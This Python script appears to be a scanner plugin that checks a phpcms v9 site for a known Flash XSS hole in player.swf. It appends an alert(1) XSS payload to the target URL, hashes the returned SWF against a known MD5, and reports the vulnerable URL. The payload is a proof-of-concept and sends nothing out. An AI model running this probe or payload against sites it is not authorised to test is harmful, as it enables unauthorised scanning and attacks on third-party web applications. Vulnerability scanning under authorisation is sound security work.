#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpcms v9 flash xss漏洞
referer: http://www.wooyun.org/bugs/wooyun-2014-079938
author: Lucifer
description: 文件player.swf中,存在xss漏洞。
'''
import sys
import urllib.request
import hashlib
import requests
import warnings
def run(url):
        result = ['phpcms v9 flash xss漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        flash_md5 = "cf00b069e36e756705c49b3a3bf20c40"
        payload = "/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf&stream=\%22))}catch(e){alert(1)}//"
        vulnurl = url + payload
        try:
            req = urllib.request.urlopen(vulnurl)
            data = req.read()
            md5_value = hashlib.md5(data).hexdigest()
            if md5_value in flash_md5:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
